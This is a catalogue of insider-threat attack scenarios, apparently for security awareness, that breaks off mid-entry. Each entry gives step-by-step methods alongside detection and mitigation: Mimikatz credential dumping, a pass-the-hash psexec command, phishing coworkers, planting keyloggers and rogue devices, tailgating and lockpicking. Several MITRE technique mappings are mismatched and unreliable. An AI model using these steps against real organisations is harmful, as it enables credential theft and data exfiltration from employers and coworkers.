# Insider Threat Attacks

## Unauthorized Access Using Shared Admin Credentials

- **Attack Type**: Credential & Access Abuse
- **Target**: Internal HR File Server
- **Vulnerability**: Shared Credentials / Poor Access Control
- **MITRE**: T1078 - Valid Accounts
- **Impact**: Data Leak, Policy Violation
- **Tools**: File Explorer, RDP, Windows Credentials Manager
- **Scenario**: An internal employee abuses shared admin credentials to access sensitive HR files not relevant to their role.
- **Attack Steps**: Step 1: Employee notices admin credentials saved in a shared internal doc or password manager.Step 2: They open Remote Desktop Connection or a mapped network drive using those credentials.Step 3: They enter the known username/password to connect.Step 4: After successful login, they browse to HR folder on shared drive or server.Step 5: They open or download confidential documents like salary sheets or performance reviews.Step 6: (Optional) They may copy it to USB or email it outside if data exfiltration is intended.
- **Detection**: File Integrity Monitoring, Role-Based Access Auditing
- **Solution**: Remove shared passwords, implement RBAC & PAM
- **Tags**: insider threat, shared credentials, access abuse

## Password Dumping from RAM Using Mimic Tool

- **Attack Type**: Credential & Access Abuse
- **Target**: Windows Server / Email
- **Vulnerability**: Credential in Memory (no LSASS protection)
- **MITRE**: T1003.001 - LSASS Memory
- **Impact**: Unauthorized Mail Access
- **Tools**: Mimikatz, Windows PowerShell, RDP
- **Scenario**: A system administrator uses legitimate access to extract passwords from memory using Mimikatz and accesses the CFO's mailbox.
- **Attack Steps**: Step 1: Insider logs into a Windows machine using their normal admin account.Step 2: They download and extract Mimikatz from a flash drive.Step 3: Run mimikatz.exe as Administrator.Step 4: Inside Mimikatz, type:privilege::debug and hit enter.Then type:sekurlsa::logonpasswordsStep 5: Look for plaintext credentials of users like "cfouser" or others in the output.Step 6: Use those credentials to log in to the CFO’s email using Outlook Web Access or RDP.
- **Detection**: LSASS Monitoring, Credential Guard
- **Solution**: Implement LSASS protection, block unauthorized tools
- **Tags**: insider, mimikatz, credential dump

## Abusing Service Account Credentials Stored in Scripts

- **Attack Type**: Credential & Access Abuse
- **Target**: Database Server
- **Vulnerability**: Hardcoded credentials in scripts
- **MITRE**: T1552.001 - Credentials in Files
- **Impact**: Data Breach
- **Tools**: Notepad++, PowerShell ISE, SQL Server Management Studio
- **Scenario**: Developer finds plain text service account password inside a PowerShell script on a shared DevOps folder and uses it to access the DB server.
- **Attack Steps**: Step 1: Employee opens a shared folder where deployment scripts are stored.Step 2: Opens a file like deploy.ps1 or config.ps1 in Notepad.Step 3: Finds a line like:$dbUser = "svc_user"$dbPass = "password123"Step 4: Opens SQL Server Management Studio or uses PowerShell to connect to the DB:sqlcmd -U svc_user -P password123 -S server-nameStep 5: They run SQL queries to extract confidential customer records.Step 6: (Optional) Export data as .csv to personal storage.
- **Detection**: Script Analysis, Data Access Logs
- **Solution**: Secure credential storage (Vaults, Secrets Managers)
- **Tags**: script abuse, db credentials, insider threat

## Logging in During Odd Hours Using Old Employee Credentials

- **Attack Type**: Credential & Access Abuse
- **Target**: Windows Workstation
- **Vulnerability**: Inactive accounts left enabled
- **MITRE**: T1078.004 - Valid Accounts: Cloud Accounts
- **Impact**: IP Theft
- **Tools**: Windows RDP, File Explorer
- **Scenario**: An employee keeps login credentials of a former colleague and uses them at night to steal design blueprints.
- **Attack Steps**: Step 1: Insider notes that ex-colleague’s account is still active (john.doe).Step 2: Uses known credentials on a Saturday night via Remote Desktop.Step 3: Enters Remote Desktop Connection, types hostname or IP, then enters:Username: john.doePassword: welcome@123Step 4: After login, accesses project folders where blueprints are stored.Step 5: Copies files to USB or syncs them with personal cloud account (Google Drive, Dropbox).
- **Detection**: Login Hour Alerts, Unusual Activity Monitoring
- **Solution**: Revoke unused accounts, enforce auto-disable
- **Tags**: old accounts, blueprint theft, late login

## Reusing Default VPN Credentials

- **Attack Type**: Credential & Access Abuse
- **Target**: VPN Gateway, File Server
- **Vulnerability**: Default credentials not rotated
- **MITRE**: T1078 - Valid Accounts
- **Impact**: Remote Access Breach
- **Tools**: VPN Client (e.g., FortiClient), Remote Desktop
- **Scenario**: Employee uses a default VPN password shared during onboarding and never changed. Gains access to internal network from home.
- **Attack Steps**: Step 1: Insider recalls that the company VPN password was shared in onboarding email.Step 2: Opens VPN client and enters:Username: onboarding.userPassword: Welcome@123Step 3: Connects to internal network successfully.Step 4: Uses RDP or file sharing to access confidential folders from home.Step 5: May even attempt privilege escalation using other services internally.
- **Detection**: VPN Access Logs, Geolocation Alerts
- **Solution**: Force credential rotation, MFA for VPN
- **Tags**: vpn, onboarding, default passwords

## Browser Password Extraction by Admin

- **Attack Type**: Credential & Access Abuse
- **Target**: User Laptop, Cloud Services
- **Vulnerability**: Weak endpoint controls
- **MITRE**: T1555.003 - Credentials from Web Browsers
- **Impact**: Web App Access Abuse
- **Tools**: Chrome, Windows, NirSoft WebBrowserPassView
- **Scenario**: Admin uses access to user laptop to extract saved passwords from browser (Chrome) using browser password viewer.
- **Attack Steps**: Step 1: Admin gains access to user's laptop for “maintenance”.Step 2: Downloads WebBrowserPassView.exe from NirSoft on USB.Step 3: Runs tool on the user’s profile while they’re away.Step 4: Extracts saved passwords for Gmail, GitHub, or internal services.Step 5: Uses those passwords to access web apps or internal resources.
- **Detection**: Endpoint behavior analysis, USB access logs
- **Solution**: Disable saved passwords in browsers
- **Tags**: browser password, extraction, insider

## Shoulder Surfing & Manual Login

- **Attack Type**: Credential & Access Abuse
- **Target**: Office Desktop, Email
- **Vulnerability**: No screen/privacy protection
- **MITRE**: T1056.004 - Input Capture
- **Impact**: Impersonation, Data Leak
- **Tools**: Eyes, Keyboard
- **Scenario**: Insider watches coworker type their password, memorizes it, and later logs in to impersonate them.
- **Attack Steps**: Step 1: Employee casually observes coworker typing password during login.Step 2: Memorizes the pattern or characters.Step 3: Waits until coworker leaves desk.Step 4: Logs in to coworker’s system with the observed credentials.Step 5: Accesses email or internal tools as that person.
- **Detection**: Login pattern analysis, session anomalies
- **Solution**: Screen protectors, MFA, lock screens
- **Tags**: shoulder surfing, login abuse

## Password Reset Misuse by HR Staff

- **Attack Type**: Credential & Access Abuse
- **Target**: HR/Admin Portal
- **Vulnerability**: Misused privilege
- **MITRE**: T1098.004 - Access Token Manipulation
- **Impact**: Finance Data Breach
- **Tools**: Internal Web Portal
- **Scenario**: HR employee with password reset rights resets password of Finance user to access payroll dashboard.
- **Attack Steps**: Step 1: HR employee logs into employee management portal.Step 2: Searches for finance.user1 and clicks "Reset Password".Step 3: Sets new password Finance@123.Step 4: Logs in as finance.user1 into payroll dashboard.Step 5: Views or downloads confidential salary and tax information.
- **Detection**: Role audit logs, password reset logs
- **Solution**: Separation of duties, alert on privilege misuse
- **Tags**: hr portal, reset abuse, insider

## MFA Token Theft from Mobile

- **Attack Type**: Credential & Access Abuse
- **Target**: Cloud Apps, Web Portals
- **Vulnerability**: Physical access to MFA device
- **MITRE**: T1556.004 - Adversary-in-the-Middle
- **Impact**: 2FA Bypass, Data Exposure
- **Tools**: Mobile Phone, Google Authenticator
- **Scenario**: Employee gains temporary access to coworker’s phone and steals OTP code from authenticator app to bypass MFA.
- **Attack Steps**: Step 1: Insider borrows coworker’s phone under false pretense (e.g., "Can I call someone?").Step 2: While pretending to use the phone, opens Authenticator app.Step 3: Reads current OTP code for internal system.Step 4: Enters username and password on another device, then types the OTP.Step 5: Gains access bypassing MFA security.
- **Detection**: MFA access audit logs, IP/device mismatch alerts
- **Solution**: App PIN protection, device lock, biometric
- **Tags**: mfa abuse, otp, token theft

## Credential Harvesting via Fake IT Helpdesk Email

- **Attack Type**: Credential & Access Abuse
- **Target**: Internal Users, Web Apps
- **Vulnerability**: Social Engineering
- **MITRE**: T1566.002 - Spearphishing via Link
- **Impact**: Unauthorized Access, Account Takeover
- **Tools**: Email Client, Free HTML Form Host (e.g., Google Forms, 000webhost)
- **Scenario**: Insider sends phishing email to coworkers posing as IT helpdesk to collect login credentials using a fake login page.
- **Attack Steps**: Step 1: Insider creates a fake IT helpdesk email (e.g., helpdesk@fakeco.com).Step 2: Designs a fake login page using Google Forms or a cloned HTML login page.Step 3: Sends a mass email like:"⚠️ Action Required: Your account will be deactivated. Please verify login: [fake-link.com]"Step 4: Victims enter credentials.Step 5: Insider checks collected responses and logs in to real portals using stolen credentials.
- **Detection**: Email monitoring, phishing simulation training
- **Solution**: Phishing protection, security awareness
- **Tags**: phishing, fake login, credential theft

## Abusing Staging Environment Credentials in Production

- **Attack Type**: Credential & Access Abuse
- **Target**: DevOps Server
- **Vulnerability**: Staging credentials reused in production
- **MITRE**: T1078 - Valid Accounts
- **Impact**: Data compromise
- **Tools**: SSH, Web App, Terminal
- **Scenario**: Developer uses weak, reused staging credentials that work on production due to misconfiguration.
- **Attack Steps**: Step 1: Insider notices that credentials used in staging are:user: stageadminpass: test123Step 2: Attempts same credentials on production server SSH or admin portal.Step 3: Gains unauthorized access due to credentials being reused.Step 4: Dumps production data or modifies config files.
- **Detection**: Access logs comparison between environments
- **Solution**: Segregate credentials by environment, rotate passwords
- **Tags**: staging, reused creds, dev abuse

## Pass-the-Hash Attack from Compromised Host

- **Attack Type**: Credential & Access Abuse
- **Target**: Windows Servers
- **Vulnerability**: Password hash reuse
- **MITRE**: T1550.002 - Pass the Hash
- **Impact**: Lateral movement
- **Tools**: Mimikatz, PSExec, Windows Admin Tools
- **Scenario**: Insider with admin access dumps password hash and uses it on another system without knowing actual password.
- **Attack Steps**: Step 1: Insider runs Mimikatz on compromised host to dump NTLM hashes.Step 2: Picks hash of a user with higher privileges (e.g., admin:aad3b435b51404eeaad3b935b51304fe:31d6cfe0d16ae931b73c59d7e0c089c0).Step 3: Uses PSExec with pass-the-hash:psexec.exe -u admin -p <HASH> \\target-machine cmdStep 4: Opens command prompt on target system as admin.Step 5: Executes further commands, steals data, or installs tools.
- **Detection**: Unusual tool usage, login anomalies
- **Solution**: Enable SMB signing, Credential Guard
- **Tags**: hash abuse, lateral move, mimikatz

## Stored RDP Credentials Used to Access Other Systems

- **Attack Type**: Credential & Access Abuse
- **Target**: Internal Systems
- **Vulnerability**: Saved RDP credentials
- **MITRE**: T1555.004 - Credentials in Registry
- **Impact**: Silent access to other systems
- **Tools**: File Explorer, Windows Remote Desktop
- **Scenario**: Insider locates stored .rdp files with saved credentials and uses them to log in silently to other systems.
- **Attack Steps**: Step 1: Insider searches system for files ending in .rdp or opens saved Remote Desktop connections.Step 2: Opens RDP and clicks on a connection labeled “DB_Server”.Step 3: If credentials are saved, it logs in automatically without prompting.Step 4: Browses through system, copies or deletes critical data.
- **Detection**: Credential manager audit, saved session analysis
- **Solution**: Disable credential saving in RDP
- **Tags**: rdp, stored creds, access abuse

## Credential Theft via Screenshot Tools

- **Attack Type**: Credential & Access Abuse
- **Target**: Office Workstation
- **Vulnerability**: Visual exposure of credentials
- **MITRE**: T1113 - Screen Capture
- **Impact**: Unauthorized reuse of login info
- **Tools**: Windows Snipping Tool, LightShot, OBS
- **Scenario**: Employee uses screenshot tool to capture coworker’s screen during login or password manager unlock.
- **Attack Steps**: Step 1: Insider installs LightShot or uses Snipping Tool.Step 2: Pretends to help coworker or sits near them during login.Step 3: Quickly snaps a screenshot when password manager is visible.Step 4: Zooms into screenshot to read credentials.Step 5: Reuses those credentials to access systems.
- **Detection**: Screenshot tool detection, session audits
- **Solution**: Privacy screens, session timeout, awareness training
- **Tags**: screen capture, screenshot abuse

## Keylogger Used to Steal Credentials Internally

- **Attack Type**: Credential & Access Abuse
- **Target**: Shared Workstation
- **Vulnerability**: No endpoint control, shared use
- **MITRE**: T1056.001 - Keylogging
- **Impact**: Unauthorized access, privacy breach
- **Tools**: Revealer Keylogger, Spyrix, USB Stick
- **Scenario**: Insider installs keylogger on a shared office machine to record other users' credentials.
- **Attack Steps**: Step 1: Insider installs a free keylogger from a USB stick (e.g., Revealer Free Edition).Step 2: Sets it to run in background at startup.Step 3: Waits for coworkers to use the system for logging in.Step 4: Keylogger records everything typed (emails, usernames, passwords).Step 5: Insider exports logs and reuses captured passwords to log in to apps or email.
- **Detection**: Antivirus alerts, process monitoring
- **Solution**: Block unauthorized software, lock shared systems
- **Tags**: keylogger, credential theft, usb attack

## Credential Sync via Compromised Mobile App

- **Attack Type**: Credential & Access Abuse
- **Target**: Mobile Device
- **Vulnerability**: Data-leaky app permissions
- **MITRE**: T1557 - Man-in-the-Middle / Sync Abuse
- **Impact**: Mobile breach, third-party data leak
- **Tools**: Malicious Android App, Password Manager
- **Scenario**: Employee installs a “notes” app that secretly syncs saved credentials from phone to their cloud.
- **Attack Steps**: Step 1: Insider installs a third-party “Note Keeper” app on their company-issued phone.Step 2: Saves passwords in the app or allows it to read clipboard.Step 3: App silently syncs the data to an attacker-controlled cloud.Step 4: Insider (or their accomplice) accesses the synced data from another device.Step 5: Uses credentials to log into work systems.
- **Detection**: EDR for mobile, traffic inspection
- **Solution**: App permission control, mobile device policy
- **Tags**: mobile, credential sync, data leak

## Stealing Session Tokens from Browser LocalStorage

- **Attack Type**: Credential & Access Abuse
- **Target**: Web Application
- **Vulnerability**: Unlocked session exposure
- **MITRE**: T1539 - Steal Web Session Cookie
- **Impact**: Session hijack, privilege abuse
- **Tools**: Chrome DevTools, File Explorer
- **Scenario**: Insider accesses coworker’s browser when unlocked and extracts session token to hijack login.
- **Attack Steps**: Step 1: Waits for coworker to leave workstation with browser still logged in.Step 2: Opens DevTools with F12, navigates to Application tab → LocalStorage.Step 3: Copies session token string.Step 4: On their own machine, uses tools like Postman or curl to replay session.Step 5: Accesses application with the same permissions as the user without password.
- **Detection**: Session IP mismatches, anomaly alerts
- **Solution**: Auto-lock systems, shorten session timeouts
- **Tags**: browser, session hijack, localStorage

## Sniffing Internal Wi-Fi with Packet Capture

- **Attack Type**: Credential & Access Abuse
- **Target**: Internal Network
- **Vulnerability**: No TLS, weak Wi-Fi segmentation
- **MITRE**: T1040 - Network Sniffing
- **Impact**: Password theft, network compromise
- **Tools**: Wireshark, Laptop
- **Scenario**: Employee connects laptop to open internal Wi-Fi and captures unencrypted credentials.
- **Attack Steps**: Step 1: Insider connects to company’s open or weakly secured internal Wi-Fi (e.g., guest Wi-Fi).Step 2: Opens Wireshark and selects the active interface.Step 3: Starts packet capture and filters for protocols like http, ftp, telnet, imap.Step 4: Views credentials in plaintext transmitted during logins.Step 5: Reuses credentials for lateral movement.
- **Detection**: Network IDS, Wi-Fi segmentation logs
- **Solution**: Use WPA3, force HTTPS and VPN internally
- **Tags**: wifi, sniffing, wireshark

## Hijacking Unexpired SSO Login from Shared Kiosk

- **Attack Type**: Credential & Access Abuse
- **Target**: Web Applications
- **Vulnerability**: Unexpired session + shared terminal
- **MITRE**: T1078.003 - Valid Accounts: SSO
- **Impact**: Unauthorized access without credentials
- **Tools**: Browser, Shared Kiosk
- **Scenario**: Insider uses shared kiosk where previous user forgot to log out of SSO-enabled app (e.g., Google Workspace).
- **Attack Steps**: Step 1: Insider walks up to shared computer (reception desk, hotel lobby, etc.).Step 2: Finds browser still logged in with SSO session (e.g., Google, Microsoft).Step 3: Opens tabs to services like Gmail, Drive, Jira.Step 4: Reads or downloads sensitive files.Step 5: May forward information to external email or USB.
- **Detection**: Login location anomalies, user session logs
- **Solution**: Enforce auto-logout, kiosk restrictions
- **Tags**: sso abuse, session hijack, kiosk

## Abuse of Password Reset Links

- **Attack Type**: Credential & Access Abuse
- **Target**: Web Application
- **Vulnerability**: Email session left active
- **MITRE**: T1078.002 - Valid Accounts: Domain Accounts
- **Impact**: Unauthorized user impersonation
- **Tools**: Web Browser, Email Access
- **Scenario**: Employee requests password reset for colleague using their email left open and changes password to access the account.
- **Attack Steps**: Step 1: Insider finds colleague’s email still logged in on a shared machine.Step 2: Goes to company portal and clicks “Forgot Password”.Step 3: Enters colleague’s email, receives reset link.Step 4: Clicks link, resets password to NewPass@123.Step 5: Logs in to the user’s account and accesses sensitive dashboards.
- **Detection**: Reset email alerts, IP mismatch detection
- **Solution**: Auto logout, alert on password reset actions
- **Tags**: password reset, impersonation, email access

## Exporting Passwords from Unlocked Password Manager

- **Attack Type**: Credential & Access Abuse
- **Target**: Password Vault / Browser
- **Vulnerability**: Unlocked session, weak controls
- **MITRE**: T1555.005 - Password Managers
- **Impact**: Theft of all credentials in one step
- **Tools**: Chrome, Firefox, Bitwarden, LastPass, CSV Export
- **Scenario**: Employee uses unlocked password manager of colleague to export all stored credentials.
- **Attack Steps**: Step 1: Waits for coworker to leave desk with password manager still unlocked.Step 2: Opens password manager extension.Step 3: Navigates to “Settings” or “Export Passwords”.Step 4: Exports entire vault to .csv.Step 5: Saves to USB or sends via email.
- **Detection**: Vault export logs (if enabled), USB activity
- **Solution**: Enforce re-auth on export, timeout lock
- **Tags**: password manager, vault abuse, csv export

## Exploiting “Remember Me” Cookie on Shared Browser

- **Attack Type**: Credential & Access Abuse
- **Target**: Web App, Browser
- **Vulnerability**: Persistent login tokens
- **MITRE**: T1539 - Steal Web Session Cookie
- **Impact**: Account misuse
- **Tools**: Chrome, Firefox
- **Scenario**: Insider accesses login of coworker who checked “Remember Me” on a browser without logout.
- **Attack Steps**: Step 1: Opens shared computer browser (e.g., training room or reception).Step 2: Goes to company login page.Step 3: Page loads without asking for credentials (auto-login enabled).Step 4: Accesses application as coworker.Step 5: Performs unauthorized actions using their session.
- **Detection**: Browser login logs, app session history
- **Solution**: Disable “Remember Me” on shared machines
- **Tags**: cookie theft, auto login, browser session

## Hijacking Backup Authentication Credentials

- **Attack Type**: Credential & Access Abuse
- **Target**: User Account, Web Portal
- **Vulnerability**: Weak backup authentication
- **MITRE**: T1078 - Valid Accounts
- **Impact**: Account compromise
- **Tools**: Web Browser, Security Questions
- **Scenario**: Insider uses recovery answers or backup email to gain access to coworker’s account during reset process.
- **Attack Steps**: Step 1: Initiates “Forgot Password” on web portal.Step 2: Chooses “Answer Security Questions” or sends reset link to known backup email (e.g., user@gmail.com).Step 3: Enters known answers (e.g., pet’s name, school).Step 4: Resets password and logs into account.Step 5: Views sensitive or restricted data.
- **Detection**: Unusual reset behavior, audit trail
- **Solution**: Remove security Qs, enforce MFA
- **Tags**: backup auth, recovery abuse

## Internal API Key Theft from Developer Repo

- **Attack Type**: Credential & Access Abuse
- **Target**: Source Code / Internal API
- **Vulnerability**: API key in plain text
- **MITRE**: T1552.001 - Credentials in Files
- **Impact**: API data leak
- **Tools**: Git, VSCode, Postman
- **Scenario**: Developer finds internal API keys hardcoded in a config file in version control and uses it to pull production data.
- **Attack Steps**: Step 1: Browses company Git repo and finds file config.js or .env with lines:API_KEY = "prod-abc123"Step 2: Copies key into Postman.Step 3: Sends request to internal API:GET https://internalapi.company.com/users?key=prod-abc123Step 4: Gets user data or sensitive financial records.Step 5: Saves or shares the data outside.
- **Detection**: API access logs, code scanning tools
- **Solution**: Store keys in secrets manager, rotate keys
- **Tags**: git, api abuse, hardcoded key

## Credential Theft via Social Engineering During Onboarding

- **Attack Type**: Credential & Access Abuse
- **Target**: Admin Panel / Dashboard
- **Vulnerability**: Weak verification of identity
- **MITRE**: T1204.001 - User Execution: Malicious Request
- **Impact**: Unauthorized dashboard access
- **Tools**: Email, Phone Call, Slack
- **Scenario**: New joiner tricks IT staff to share credentials or links by posing as a manager or senior colleague.
- **Attack Steps**: Step 1: Insider joins company and pretends to be a manager’s assistant.
Step 2: Contacts IT via internal chat/email: “Hi, I need access to Mr. Raj’s dashboard. He’s in a meeting. Can you share credentials?”
Step 3: If IT complies, insider receives login credentials or privileged link.
Step 4: Uses those to log in and access restricted data.
Step 5: Changes password or exports data silently.
- **Detection**: Manual ticket review, chat logs
- **Solution**: Verify identity via MFA or call-back
- **Tags**: onboarding, social engineering, impersonation

## IAM Dashboard Misuse by IT Staff

- **Attack Type**: Credential & Access Abuse
- **Target**: IAM Dashboard
- **Vulnerability**: Misused privileges, lack of approval
- **MITRE**: T1098 - Account Manipulation
- **Impact**: Unauthorized access escalation
- **Tools**: Azure AD, AWS IAM, Okta, Browser
- **Scenario**: IT staff uses IAM (Identity Access Management) portal to grant themselves higher privileges.
- **Attack Steps**: Step 1: Insider logs into IAM dashboard with their IT credentials.
Step 2: Locates their own account and edits permissions.
Step 3: Adds themselves to Admin, Finance, or Security roles.
Step 4: Uses new privileges to view financials or security logs.
Step 5: Exports or modifies sensitive information.
- **Detection**: IAM role change logs, privilege review
- **Solution**: Role approval workflows, alerts
- **Tags**: privilege escalation, IAM, insider

## HR Executive Misuses Payroll Credentials

- **Attack Type**: Credential & Access Abuse
- **Target**: Payroll System
- **Vulnerability**: Shared static credentials
- **MITRE**: T1078 - Valid Accounts
- **Impact**: Insider data breach
- **Tools**: Payroll Software, Web Portal
- **Scenario**: HR staff uses shared payroll credentials after leaving the team to access employee salary and bonus reports.
- **Attack Steps**: Step 1: Insider recalls that login was:
hruser: payroll_admin
password: Salary@2025
Step 2: Tries logging into payroll system after being reassigned or leaving.
Step 3: Finds that the password was never changed.
Step 4: Logs in and downloads bonus, tax, and performance reports.
Step 5: Shares or leaks data.
- **Detection**: Access logs, stale account review
- **Solution**: Rotate credentials after team change
- **Tags**: payroll, shared creds, HR misuse

## Clipboard Monitoring to Steal Copied Passwords

- **Attack Type**: Credential & Access Abuse
- **Target**: Workstation
- **Vulnerability**: Clipboard data leakage
- **MITRE**: T1115 - Clipboard Data
- **Impact**: Silent credential theft
- **Tools**: Clipboard Logger Tool, Windows PowerShell
- **Scenario**: Insider runs background clipboard monitor that logs all copied passwords (often copied from vaults).
- **Attack Steps**: Step 1: Insider runs PowerShell script or tool to constantly monitor clipboard.
Step 2: Waits for coworker to copy a password from their password manager.
Step 3: Script logs every clipboard entry.
Step 4: Insider checks logs and copies captured passwords.
Step 5: Uses passwords to log into sensitive systems.
- **Detection**: Clipboard access monitoring
- **Solution**: Disable clipboard use for passwords
- **Tags**: clipboard, password manager, monitoring

## Shared Credential Abuse in Remote Work Teams

- **Attack Type**: Credential & Access Abuse
- **Target**: Collaboration Tools
- **Vulnerability**: Shared account reuse
- **MITRE**: T1078.001 - Valid Accounts: Default Accounts
- **Impact**: Espionage, data leak
- **Tools**: Zoom, Notion, Slack, Web Browser
- **Scenario**: Remote worker continues to use a previously shared Zoom or Notion credential to spy on meetings and documents.
- **Attack Steps**: Step 1: Insider notes shared login:
user: marketing_team
password: Collab2024
Step 2: Uses credential to log into Zoom meeting link or shared workspace.
Step 3: Observes private internal discussions or downloads files.
Step 4: Continues using login even after switching teams.
Step 5: Screenshots or records content for personal use.
- **Detection**: Geo login anomaly detection, idle user reviews
- **Solution**: Replace shared logins with SSO & IAM
- **Tags**: zoom, notion, shared creds

## USB Drop Attack in Break Room

- **Attack Type**: Physical Access Exploit
- **Target**: Employee Workstation
- **Vulnerability**: Human Curiosity
- **MITRE**: T1200 - Hardware Additions
- **Impact**: Initial Access via Physical Media
- **Tools**: Infected USB with payload
- **Scenario**: A malicious insider drops infected USB drives in common areas, hoping employees will plug them into office PCs.
- **Attack Steps**: Step 1: Buy a few cheap USB drives. Step 2: Use a computer to load a small harmless script that opens a browser and sends device info to a server. Step 3: Label the USBs with tempting names like “Salary Info” or “Confidential”. Step 4: Leave them in the office break room, bathroom, or lobby. Step 5: Wait and track if any device connects.
- **Detection**: Endpoint detection logs, USB insert logs
- **Solution**: Disable USB ports, employee training, EDR alerts
- **Tags**: USB, Social Engineering, Low-Tech, Initial Access

## Unauthorized Server Room Access

- **Attack Type**: Physical Access Exploit
- **Target**: Server Room
- **Vulnerability**: Lack of Access Control
- **MITRE**: T1078 - Valid Accounts (Physical)
- **Impact**: Service Disruption
- **Tools**: None
- **Scenario**: An employee tailgates into the server room and unplugs a system to cause disruption.
- **Attack Steps**: Step 1: Wait outside the server room until someone with access opens it. Step 2: Follow behind them (tailgating) without a badge. Step 3: Once inside, unplug a server or switch to cause outage. Step 4: Exit without leaving any visible trace.
- **Detection**: CCTV, door access logs, environmental monitoring
- **Solution**: Biometric locks, security guards, tailgating policies
- **Tags**: Tailgating, Physical Breach, Server Room

## Stolen Access Card Used for Night Entry

- **Attack Type**: Physical Access Exploit
- **Target**: Office Computer
- **Vulnerability**: Badge Theft
- **MITRE**: T1056 - Input Capture
- **Impact**: Credential Theft
- **Tools**: Stolen badge, USB keylogger
- **Scenario**: A disgruntled employee steals a colleague’s access card and returns after hours to plant a keylogger.
- **Attack Steps**: Step 1: Steal or borrow a coworker's ID card. Step 2: Return to office after hours. Step 3: Plug a USB keylogger between keyboard and computer. Step 4: Leave the device running to capture credentials. Step 5: Collect the device next day.
- **Detection**: Access logs vs employee schedule
- **Solution**: Use smart cards with PIN, report lost cards immediately
- **Tags**: Badge Theft, After-hours Access, Keylogging

## Planting Rogue Device in Network Cabinet

- **Attack Type**: Physical Access Exploit
- **Target**: LAN Infrastructure
- **Vulnerability**: Open Ports in Cabinets
- **MITRE**: T1029 - Remote System Discovery
- **Impact**: Sensitive Data Interception
- **Tools**: Raspberry Pi, LAN cable
- **Scenario**: A temporary contractor installs a rogue Raspberry Pi in a network cabinet to sniff internal traffic.
- **Attack Steps**: Step 1: Bring a small Raspberry Pi in a pocket or bag. Step 2: Access a less monitored network cabinet (under desk, meeting room). Step 3: Connect it to a switch port and power. Step 4: Let it capture internal traffic like credentials or session info. Step 5: Retrieve it after a few days.
- **Detection**: Network anomaly detection, rogue device scans
- **Solution**: Restrict physical access, seal cabinets, regular audits
- **Tags**: Rogue Device, Sniffing, LAN Exploit

## Shoulder Surfing and Manual Password Entry

- **Attack Type**: Physical Access Exploit
- **Target**: Desktop
- **Vulnerability**: Lack of Screen Privacy
- **MITRE**: T1056.002 - Shoulder Surfing
- **Impact**: Unauthorized Data Access
- **Tools**: None
- **Scenario**: A cleaner observes an employee typing passwords, then uses the same desk after hours to log in.
- **Attack Steps**: Step 1: Observe an employee from behind while they type their password. Step 2: Memorize or write it down discreetly. Step 3: Wait until after hours or next break. Step 4: Sit at the same desk and log in using the stolen credentials. Step 5: Access sensitive data or install malicious tools.
- **Detection**: User activity monitoring, login time anomalies
- **Solution**: Use screen privacy filters, auto-lock screens
- **Tags**: Shoulder Surfing, Low-Tech Attack, Manual Exploit

## Insider Photos Password on Sticky Note

- **Attack Type**: Physical Access Exploit
- **Target**: User Workstation
- **Vulnerability**: Poor Password Practices
- **MITRE**: T1556 - Input Capture
- **Impact**: Unauthorized Access
- **Tools**: Smartphone camera
- **Scenario**: An insider takes photos of passwords written on sticky notes left on desks.
- **Attack Steps**: Step 1: Walk around during breaks or cleaning time. Step 2: Look for any sticky notes on desks or under keyboards. Step 3: Take a photo using your phone quickly and quietly. Step 4: Use the passwords later to log into systems. Step 5: Clear browser history after use.
- **Detection**: Login logs, device logs
- **Solution**: Enforce password policy, no sticky notes, regular audits
- **Tags**: Sticky Note, Credential Theft, Camera

## Plugging in Laptop to Internal LAN

- **Attack Type**: Physical Access Exploit
- **Target**: Office Network
- **Vulnerability**: Open Network Ports
- **MITRE**: T1190 - Exploit Public-Facing Application (Physical equivalent)
- **Impact**: Internal Data Exposure
- **Tools**: Personal laptop, Ethernet cable
- **Scenario**: A visitor plugs their own laptop into an available Ethernet port to access internal systems.
- **Attack Steps**: Step 1: Locate a free network port in a meeting room or open area. Step 2: Connect your laptop using an Ethernet cable. Step 3: Try to access shared folders, printers, or internal websites. Step 4: Download any available documents or data. Step 5: Disconnect before anyone notices.
- **Detection**: MAC address logging, NAC alerts
- **Solution**: Use network access control (NAC), disable unused ports
- **Tags**: Unauthorized Device, LAN Entry

## Piggyback Entry with Delivery Crew

- **Attack Type**: Physical Access Exploit
- **Target**: Restricted Zones
- **Vulnerability**: Poor Entry Supervision
- **MITRE**: T1078 - Valid Accounts (Physical Entry)
- **Impact**: Physical Intrusion
- **Tools**: None (Social engineering)
- **Scenario**: An insider pretends to be part of a delivery team to sneak into secure areas.
- **Attack Steps**: Step 1: Wait near loading dock or delivery entry. Step 2: Walk in with real delivery crew carrying a small box. Step 3: Act like you belong, avoid eye contact. Step 4: Enter restricted area like server room or office floor. Step 5: Place a USB device or observe activities.
- **Detection**: CCTV, physical access logs
- **Solution**: Security escorts, camera coverage, ID checks
- **Tags**: Piggyback, Delivery Disguise, Tailgating

## Installing Wireless Keyboard Logger

- **Attack Type**: Physical Access Exploit
- **Target**: Wireless Keyboard
- **Vulnerability**: USB Access + Lack of Supervision
- **MITRE**: T1056 - Input Capture
- **Impact**: Password Interception
- **Tools**: Wireless keylogger dongle
- **Scenario**: An employee installs a wireless keylogger on a manager’s wireless keyboard to intercept passwords.
- **Attack Steps**: Step 1: Buy a wireless keyboard sniffer (keylogger USB). Step 2: Wait for manager to leave desk. Step 3: Plug in device between wireless receiver and USB port. Step 4: Let it run silently to collect keystrokes. Step 5: Retrieve device later and extract logged data.
- **Detection**: USB scan, endpoint behavior detection
- **Solution**: Block unauthorized USBs, lock computers
- **Tags**: Wireless Logger, Hardware Sniffing

## Locked Drawer Bypass for Document Theft

- **Attack Type**: Physical Access Exploit
- **Target**: File Cabinet
- **Vulnerability**: Weak Locking Mechanism
- **MITRE**: T1110 - Brute Force (Physical Equivalent)
- **Impact**: Data Privacy Violation
- **Tools**: Hairpin or lockpick set
- **Scenario**: A staff member picks a drawer lock to access HR files containing employee records.
- **Attack Steps**: Step 1: Identify the drawer where HR or payroll files are kept. Step 2: Wait until no one is nearby. Step 3: Use a hairpin or simple pick set to unlock the drawer (YouTube tutorials exist). Step 4: Take photos of important documents. Step 5: Lock the drawer again and walk away.
- **Detection**: Tamper-evident drawer seals, CCTV
- **Solution**: Use biometric/file-safe lockers, monitor sensitive areas
- **Tags**: Lockpicking, Document Theft, Physical Bypass

## Sneaking into Office After Hours via Window

- **Attack Type**: Physical Access Exploit
- **Target**: Office Area
- **Vulnerability**: Poor Physical Security
- **MITRE**: T1200 - Hardware Additions
- **Impact**: Data Theft or Tampering
- **Tools**: None
